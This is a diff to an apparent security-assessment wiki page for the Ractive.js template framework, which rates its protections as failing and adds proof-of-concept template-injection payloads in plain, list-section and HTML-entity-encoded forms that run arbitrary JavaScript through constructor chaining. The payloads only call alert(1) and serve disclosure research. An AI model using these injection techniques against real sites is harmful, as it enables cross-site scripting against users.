@@ -19,10 +19,10 @@ From http://www.ractivejs.org/
 
 
  * *{}SEC-A* <font color="red">*FAIL*</font> Template expressions are equivalent to `eval`
- * *{}SEC-B* <font color="red">*FAIL*</font> No sandbox or isolated execution scope
- * *{}SEC-C* <font color="red">*FAIL*</font> !JavaScript code will be executed from within `data` attributes
+ * *{}SEC-B* <font color="red">*FAIL*</font> No sandbox or isolated execution scope, yet attempts to pre-parse expressions
+ * *{}SEC-C* <font color="red">*FAIL*</font> !JavaScript code will be executed from within HTML element's `textContent`
  * *{}SEC-D* <font color="red">*FAIL*</font> No enforced separation, no obvious way to outsource templates to static files
- * *{}SEC-E* <font color="red">*FAIL*</font> No dedicated security response program, no security@knockoutjs.com address
+ * *{}SEC-E* <font color="red">*FAIL*</font> No dedicated security response program, a mailing list exists though
 
 = Injection Attacks =
 
@@ -35,6 +35,24 @@ The following "paste-and-go"-ready code example demonstrates that.
 {{{
 <script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
 <div id="test">{{1..constructor.constructor("alert(1)")()}}</div>
+<script>
+new Ractive({template: '#test'});
+</script>
+}}}
+
+Similar things can be done with list sections:
+
+{{{
+<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
+<div id="test">{{#1..constructor.constructor('alert(1)')():num}}</div>
+<script>
+new Ractive({template: '#test'});
+</script>
+
+And, almost needless to say, encoded payload does the trick too:
+
+<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
+<div id="test">&#x7b;&#x7b;&#x23;1..constructor.constructor('alert(1)')():num&#x7d;&#x7d;</div>
 <script>
 new Ractive({template: '#test'});
 </script>
